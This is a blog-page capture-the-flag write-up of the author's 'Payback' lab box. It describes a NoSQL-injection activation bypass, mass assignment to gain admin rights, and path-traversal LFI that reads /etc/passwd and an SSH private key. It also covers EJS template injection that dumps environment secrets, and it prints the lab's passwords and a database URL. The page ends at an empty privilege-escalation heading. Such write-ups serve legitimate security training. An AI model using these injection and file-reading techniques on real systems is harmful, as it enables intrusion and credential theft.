<!DOCTYPE html><html lang="en"mode="dark"><!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><!-- i18n for `_javascript/utils/timeago.js` -->
    <meta name="day-prompt" content="days ago">
    <meta name="hour-prompt" content="hours ago">
    <meta name="minute-prompt" content="minutes ago">
    <meta name="justnow-prompt" content="just now"><!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.1" />
<meta property="og:title" content="Payback - OdysseyCTF" />
<meta property="og:locale" content="en" />
<meta name="description" content="Payback is a hard-rated box created by me for the OdysseyCTF. It starts with exploiting a NoSQL injection vulnerability in a custom application to bypass registration restrictions, and then a mass assignment vulnerability to escalate to a higher privilege. This exposes an administrative function that’s vulnerable to LFI, which can be used to gain a shell on the box. Once inside, a hidden application running locally can be accessed using a tunnel and a credential recovered from the history file of MongoDB CLI tool. The app is vulnerable to SSTI, and can be exploited to access another local user. Priv-esc to root is by exploiting a race condition in a custom binary that uses libcurl to download files (this part was removed in the instance used for the competition)." />
<meta property="og:description" content="Payback is a hard-rated box created by me for the OdysseyCTF. It starts with exploiting a NoSQL injection vulnerability in a custom application to bypass registration restrictions, and then a mass assignment vulnerability to escalate to a higher privilege. This exposes an administrative function that’s vulnerable to LFI, which can be used to gain a shell on the box. Once inside, a hidden application running locally can be accessed using a tunnel and a credential recovered from the history file of MongoDB CLI tool. The app is vulnerable to SSTI, and can be exploited to access another local user. Priv-esc to root is by exploiting a race condition in a custom binary that uses libcurl to download files (this part was removed in the instance used for the competition)." />
<link rel="canonical" href="https://4g3nt47.github.io/posts/ctf/payback.html" />
<meta property="og:url" content="https://4g3nt47.github.io/posts/ctf/payback.html" />
<meta property="og:site_name" content="4g3nt47" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2023-07-31T00:00:00+01:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Payback - OdysseyCTF" />
<meta name="twitter:site" content="@UmarAbdoul" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"description":"Payback is a hard-rated box created by me for the OdysseyCTF. It starts with exploiting a NoSQL injection vulnerability in a custom application to bypass registration restrictions, and then a mass assignment vulnerability to escalate to a higher privilege. This exposes an administrative function that’s vulnerable to LFI, which can be used to gain a shell on the box. Once inside, a hidden application running locally can be accessed using a tunnel and a credential recovered from the history file of MongoDB CLI tool. The app is vulnerable to SSTI, and can be exploited to access another local user. Priv-esc to root is by exploiting a race condition in a custom binary that uses libcurl to download files (this part was removed in the instance used for the competition).","@type":"BlogPosting","url":"https://4g3nt47.github.io/posts/ctf/payback.html","headline":"Payback - OdysseyCTF","dateModified":"2023-07-31T00:00:00+01:00","datePublished":"2023-07-31T00:00:00+01:00","mainEntityOfPage":{"@type":"WebPage","@id":"https://4g3nt47.github.io/posts/ctf/payback.html"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<title>Payback - OdysseyCTF | 4g3nt47
  </title><!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
--><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="4g3nt47">
<meta name="application-name" content="4g3nt47">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">
<!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA --><!-- Bootstrap -->
  <link rel="stylesheet" href="/assets/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="/assets/css/all.min.css"><!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet"
    href="/assets/css/bootstrap-toc.min.css"><!-- Manific Popup -->
  <link rel="stylesheet" href="/assets/css/magnific-popup.min.css"><!-- JavaScript -->

  <script src="/assets/js/jquery.min.js"></script>

</head>
<body data-spy="scroll" data-target="#toc"><!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end" lang="en">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto"><img src="/assets/img/avatar.png" alt="avatar" onerror="this.style.display='none'"></a>
    </div>

    <div class="site-title mt-3">
      <a href="/">4g3nt47</a>
    </div>
    <div class="site-subtitle font-italic">Welcome to my infosec blog</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs --><li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i><span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item --><li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i><span>TAGS</span>
      </a>
    </li> <!-- .nav-item --><li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i><span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item --><li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i><span>ABOUT</span>
      </a>
    </li> <!-- .nav-item --></ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"><a href="https://github.com/4g3nt47" aria-label="github"target="_blank" rel="noopener">
        <i class="fab fa-github"></i>
      </a><a href="https://twitter.com/UmarAbdoul" aria-label="twitter"target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a><a href="javascript:location.href = 'mailto:' + ['aufaruq02','gmail.com'].join('@')" aria-label="email">
        <i class="fas fa-envelope"></i>
      </a><a href="/rss/feed.xml" aria-label="rss">
        <i class="fas fa-rss"></i>
      </a></div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->
<!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb"><span>
            <a href="/">
              Home
            </a>
          </span><span>Payback - OdysseyCTF</span></span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">Post</div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>
<div id="main-wrapper">
      <div id="main">

        <div class="row">

  <!-- core -->
  <div id="core-wrapper" class="col-12 col-lg-11 col-xl-8">
    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><!--
  Refactor the HTML structure.
--><!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
--><!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
--><!-- Add attribute 'hide-bullet' to the checkbox list --><!-- images --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add CDN URL --><!-- Add image path --><!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> --><!-- Add SVG placehoder to prevent layout reflow --><!-- Bypass the HTML-proofer test --><!-- Add header for code snippets --><!-- Create heading anchors --><!-- return -->

<h1 data-toc-skip>Payback - OdysseyCTF</h1>

<div class="post-meta text-muted">

  <!-- author -->
  <div>By
    <em><a href="https://twitter.com/UmarAbdoul">Umar Abdul</a></em>
  </div>

  <div class="d-flex">
    <div>
      <!-- published date -->
      <span>
        Posted<!--
  Date format snippet
  See: ${JS_ROOT}/utils/timeago.js
--><em class="timeago"
    date="2023-07-31 00:00:00 +0100"data-toggle="tooltip"
      data-placement="bottom"
      title="Mon, Jul 31, 2023, 12:00 AM +0100">Jul 31</em>
</span>

      <!-- lastmod date --><!-- read time --><!--
  Calculate the post's reading time, and display the word count in tooltip
 --><!-- words per minute  --><!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="2361 words">
  <em>13 min</em> read</span>
<!-- page views --></div>

  </div> <!-- .d-flex -->

</div> <!-- .post-meta -->

<div class="post-content">
  <p><strong>Payback</strong> is a hard-rated box created by <a href="https://github.com/4g3nt47">me</a> for the <a href="https://ctftime.org/event/2029/">OdysseyCTF</a>. It starts with exploiting a <em>NoSQL injection</em> vulnerability in a custom application to bypass registration restrictions, and then a <em>mass assignment</em> vulnerability to escalate to a higher privilege. This exposes an administrative function that’s vulnerable to <em>LFI</em>, which can be used to gain a shell on the box. Once inside, a hidden application running locally can be accessed using a tunnel and a credential recovered from the history file of MongoDB CLI tool. The app is vulnerable to <em>SSTI</em>, and can be exploited to access another local user. Priv-esc to root is by exploiting a <em>race condition</em> in a custom binary that uses <em>libcurl</em> to download files (this part was removed in the instance used for the competition).</p>

<p><br /></p>

<h4 id="recon">Recon<a href="#recon" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<p>Going to the web server homepage for this challenge;</p>

<p><img data-src="/assets/img/Pasted image 20230628021422.png" alt="" data-proofer-ignore></p>

<p>Clicking the link made a request to an unknown host;</p>

<p><img data-src="/assets/img/Pasted image 20230628021452.png" alt="" data-proofer-ignore></p>

<p>After adding this host to <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file, the page loads successfully;</p>

<p><img data-src="/assets/img/Pasted image 20230628021815.png" alt="" data-proofer-ignore></p>

<p>Attempt to create an account through the registration tab failed with the following error;</p>

<p><img data-src="/assets/img/Pasted image 20230628022023.png" alt="" data-proofer-ignore></p>

<p>Checking the developer console showed an error with a new subdomain;</p>

<p><img data-src="/assets/img/Pasted image 20230628022243.png" alt="" data-proofer-ignore></p>

<p>Adding the host <code class="language-plaintext highlighter-rouge">exa-api.payback.local</code> to my <code class="language-plaintext highlighter-rouge">/etc/hosts</code> file fixed the issue, and the account was created. However, I was prompted for an activation code, which I do not have;</p>

<p><img data-src="/assets/img/Pasted image 20230628022536.png" alt="" data-proofer-ignore></p>

<p>Trying to guess the code didn’t work;</p>

<p><img data-src="/assets/img/Pasted image 20230628022659.png" alt="" data-proofer-ignore></p>

<p>The route <code class="language-plaintext highlighter-rouge">/user/activate/&lt;username&gt;</code> is responsible for validating the code;</p>

<p><img data-src="/assets/img/Pasted image 20230628022839.png" alt="" data-proofer-ignore></p>

<p>The response headers indicate this is an <em>Express (NodeJS)</em> application running behind an <em>Nginx</em> reverse-proxy. Playing around with the request, the implementation was found to be vulnerable to <em>NoSQL Injection</em> as the application seems to accept a JSON object as the value of <code class="language-plaintext highlighter-rouge">activationCode</code>, which appears to be passed directly to the underlying query. The MongoDB query <code class="language-plaintext highlighter-rouge">{"$ne": 1}</code>, which will evaluate to <code class="language-plaintext highlighter-rouge">true</code> when been matched with anything that is not <code class="language-plaintext highlighter-rouge">1</code>, allowed me to pass the validation;</p>

<p><img data-src="/assets/img/Pasted image 20230628023612.png" alt="" data-proofer-ignore></p>

<p>I was then able to login to the web app as the user <code class="language-plaintext highlighter-rouge">guest</code>;</p>

<p><img data-src="/assets/img/Pasted image 20230628023720.png" alt="" data-proofer-ignore></p>

<hr />

<p><br /></p>

<h4 id="foothold">Foothold<a href="#foothold" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<p>Playing around with the available courses didn’t yield anything interesting. <em>WEB101</em> is password-protected, and I had no luck getting in. <em>HIST101</em> is open though;</p>

<p><img data-src="/assets/img/Pasted image 20230628024020.png" alt="" data-proofer-ignore></p>

<p><img data-src="/assets/img/Pasted image 20230628024145.png" alt="" data-proofer-ignore></p>

<p>Along with my results for the test, the profile page also has a field for password reset;</p>

<p><img data-src="/assets/img/Pasted image 20230628024230.png" alt="" data-proofer-ignore></p>

<p>The feature works, and the request was made to <code class="language-plaintext highlighter-rouge">/user/profile</code>;</p>

<p><img data-src="/assets/img/Pasted image 20230628024421.png" alt="" data-proofer-ignore></p>

<p>Going through burp’s history, I noticed that this route also accepts a GET request that returns profile data of the user;</p>

<p><img data-src="/assets/img/Pasted image 20230628024552.png" alt="" data-proofer-ignore></p>

<p>The <code class="language-plaintext highlighter-rouge">admin</code> parameter is very interesting. Since the route seems to be associated with general user profile data, and is also used to update user password, could it be used to update other profile parameters beside the ones featured in the UI? So I made a request that updates the <code class="language-plaintext highlighter-rouge">admin</code> parameter and sets it to <code class="language-plaintext highlighter-rouge">true</code>, and no error was returned;</p>

<p><img data-src="/assets/img/Pasted image 20230628025014.png" alt="" data-proofer-ignore></p>

<p>A GET request to the route showed that the update succeeded, although the web UI was not updated in the browser;</p>

<p><img data-src="/assets/img/Pasted image 20230628025139.png" alt="" data-proofer-ignore></p>

<p>So I logged out and then logged back in, and a new tab named “Admin” appeared;</p>

<p><img data-src="/assets/img/Pasted image 20230628025258.png" alt="" data-proofer-ignore></p>

<p>The “Manage Courses” feature was interesting as I previously had no access to the “WEB101” course. However, there wasn’t any option to get or reset the course password;</p>

<p><img data-src="/assets/img/Pasted image 20230628025511.png" alt="" data-proofer-ignore></p>

<p>I tried to export available results, but none was available. Trying the “Export Questions” option worked, and a download for a .json file was initiated. Nothing interesting was found inside the JSON file. However, the URL used for the download stood out;</p>

<p><img data-src="/assets/img/Pasted image 20230628025737.png" alt="" data-proofer-ignore></p>

<p>This hints at a possible <em>Local File Inclusion (LFI)</em> vulnerability. After playing around with it, it seems the only security check the application is doing on requested files is making sure that their name starts with “exports/” prior to any path normalization. This makes it vulnerable to LFI via <em>path traversal</em>, and I was able to read local files;</p>

<p><img data-src="/assets/img/Pasted image 20230628030026.png" alt="" data-proofer-ignore></p>

<p>Reading <code class="language-plaintext highlighter-rouge">/etc/passwd</code> showed that 2 local users exist: <code class="language-plaintext highlighter-rouge">agent47</code> and <code class="language-plaintext highlighter-rouge">exa</code>. The user <code class="language-plaintext highlighter-rouge">exa</code> is likely the user we are working with as it matches the name of the web app. Since we know SSH is running on the host, I tried to read the user’s SSH key, which should be at <code class="language-plaintext highlighter-rouge">/home/exa/.ssh/id_rsa</code>, and it worked;</p>

<p><img data-src="/assets/img/Pasted image 20230628030308.png" alt="" data-proofer-ignore></p>

<p>I saved this key as <code class="language-plaintext highlighter-rouge">exa.key</code> locally, and was able to login through SSH;</p>

<p><img data-src="/assets/img/Pasted image 20230628030509.png" alt="" data-proofer-ignore></p>

<hr />

<p><br /></p>

<h4 id="user">User<a href="#user" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

<p>The user <code class="language-plaintext highlighter-rouge">exa</code> does not belong to any special groups, nor can we check for SUDO perms as we still don’t have their password. Exploring the home directory of the user, an interesting file <code class="language-plaintext highlighter-rouge">.dbshell</code> was found, which is what the <em>MongoDB</em> client uses as history file for the <em>MongoDB</em> CLI client;</p>

<p><img data-src="/assets/img/Pasted image 20230628030830.png" alt="" data-proofer-ignore></p>

<p>Going through the file reveals a possible cred;</p>

<p><img data-src="/assets/img/Pasted image 20230628030927.png" alt="" data-proofer-ignore></p>

<p>The password is not used by any of the local user accounts, so I kept it aside and continue to explore. 
As we noticed during recon, the web app was running behind an <em>nginx</em> reverse-proxy, and seems to be using virtual hosts.  Checking the <em>nginx</em> config files at <code class="language-plaintext highlighter-rouge">/etc/nginx/sites-enabled/</code>, a new vhost was discovered in the file named <code class="language-plaintext highlighter-rouge">payback</code>;</p>

<p><img data-src="/assets/img/Pasted image 20230628031333.png" alt="" data-proofer-ignore></p>

<p>Notice that the vhost was configured to be accessible only to clients in the local network, with the actual server listening locally on port <code class="language-plaintext highlighter-rouge">3000</code>. With our SSH access as user <code class="language-plaintext highlighter-rouge">exa</code>, we can easily setup a tunnel to access this site;</p>

<p><img data-src="/assets/img/Pasted image 20230628031519.png" alt="" data-proofer-ignore></p>

<p>The site is now accessible locally on my box through port <code class="language-plaintext highlighter-rouge">3000</code>;</p>

<p><img data-src="/assets/img/Pasted image 20230628031809.png" alt="" data-proofer-ignore></p>

<p>It seems to be a site for sharing quotes. Attempt to create an account failed;</p>

<p><img data-src="/assets/img/Pasted image 20230628031900.png" alt="" data-proofer-ignore></p>

<p>Remembering the previous credential we discovered in the home of <code class="language-plaintext highlighter-rouge">exa</code> in <code class="language-plaintext highlighter-rouge">.dbshell</code>, I tried it in the login page, and was able to login using <code class="language-plaintext highlighter-rouge">admin:c036c836be2aaea2cb7222fb72eeea3a</code>;</p>

<p><img data-src="/assets/img/Pasted image 20230628032106.png" alt="" data-proofer-ignore></p>

<p>We now have the option to add a quote. However, clicking “submit” says the feature is disabled;</p>

<p><img data-src="/assets/img/Pasted image 20230628032148.png" alt="" data-proofer-ignore></p>

<p>The “preview” feature is still working though;</p>

<p><img data-src="/assets/img/Pasted image 20230628032303.png" alt="" data-proofer-ignore></p>

<p>I started playing with the requests to see if this could be exploited. Like the <em>Exa</em> web app, this app is also powered by <em>Express (NodeJS)</em>. However, this app doesn’t seems to be using a frontend library as the quote entered is submitted to the backend through a POST request to <code class="language-plaintext highlighter-rouge">/api/quote/preview</code>, and a GET request is then made to the same route, which returns a pre-rendered page containing the new quote. So I started testing for <em>Server Side Template Injections (SSTI)</em> in the quote preview feature, as it’s the only place I could inject input, and it payed off! The site is using <em>EJS</em> template engine;</p>

<p><img data-src="/assets/img/Pasted image 20230628033259.png" alt="" data-proofer-ignore></p>

<p><img data-src="/assets/img/Pasted image 20230628033331.png" alt="" data-proofer-ignore></p>

<p>I tried a few RCE payloads, but none worked due to lack of access to the <code class="language-plaintext highlighter-rouge">require</code> command, so I moved on. The file <code class="language-plaintext highlighter-rouge">.env</code> is popular with NodeJS applications, and it’s commonly used to store secrets like database credentials and API keys. This file is typically imported using the <code class="language-plaintext highlighter-rouge">dotenv</code> module, which parses and store it into the <code class="language-plaintext highlighter-rouge">process.env</code> object. Using the <em>SSTI</em>, I was able to read this object and obtain the backend database credential;</p>

<p><img data-src="/assets/img/Pasted image 20230628033655.png" alt="" data-proofer-ignore></p>

<p><img data-src="/assets/img/Pasted image 20230628033729.png" alt="" data-proofer-ignore></p>

<p><img data-src="/assets/img/Pasted image 20230628033822.png" alt="" data-proofer-ignore></p>

<p>I was able to access the backend DB using the URL <code class="language-plaintext highlighter-rouge">mongodb://qruser:2abe35c9146772663efba402620062a2@localhost/qrdb</code>;</p>

<p><img data-src="/assets/img/Pasted image 20230628033921.png" alt="" data-proofer-ignore></p>

<p>The <code class="language-plaintext highlighter-rouge">users</code> collection looks interesting, so I dumped it. Inside I found username and password hash of 2 users: <code class="language-plaintext highlighter-rouge">admin</code> (which we already have), and <code class="language-plaintext highlighter-rouge">agent47</code> (which is the username of a local user account on the box);</p>

<p><img data-src="/assets/img/Pasted image 20230628212422.png" alt="" data-proofer-ignore></p>

<p>The password hash looks to be MD5, so I copied it to a file and tried to crack it using <em>John the Ripper</em>. It worked! The creds are <code class="language-plaintext highlighter-rouge">agent47:angle0164363985</code>;</p>

<p><img data-src="/assets/img/Pasted image 20230628212734.png" alt="" data-proofer-ignore></p>

<p>Testing this cred against the local user account of <code class="language-plaintext highlighter-rouge">agent47</code>, I was able to login;</p>

<p><img data-src="/assets/img/Pasted image 20230628212948.png" alt="" data-proofer-ignore></p>

<hr />

<p><br /></p>

<h4 id="privesc">PrivEsc<a href="#privesc" class="anchor"><i class="fas fa-hashtag"></i></a></h4></h4>
<p><br /></p>

